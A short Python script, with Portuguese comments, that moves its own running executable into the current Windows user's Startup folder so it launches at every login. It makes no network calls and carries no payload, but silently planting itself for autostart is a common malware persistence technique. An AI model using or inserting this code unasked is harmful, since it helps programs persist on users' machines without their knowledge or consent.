
import os
import shutil
import sys

def obter_nome_usuario_windows():
    return os.environ.get('USERNAME')

def mover_executavel_para_pasta_destino(pasta_destino):
    try:
        # Obtém o caminho completo do executável
        exec_path = os.path.abspath(sys.argv[0])

        # Obtém o diretório onde o executável está sendo executado
        exec_dir = os.path.dirname(exec_path)
        if exec_dir != pasta_destino:
            # Move o executável para a pasta de destino
            shutil.move(exec_path, os.path.join(pasta_destino, os.path.basename(exec_path)))

        print(f"Executável movido para {pasta_destino}")
    except Exception as e:
        print(f"Erro ao mover o executável: {e}")


nome_usuario = obter_nome_usuario_windows()
pasta_destino = rf'C:\Users\{nome_usuario}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' #Este Caminho é um exemplo, pode substituí-lo por qualquer outro que desejar
mover_executavel_para_pasta_destino(pasta_destino)

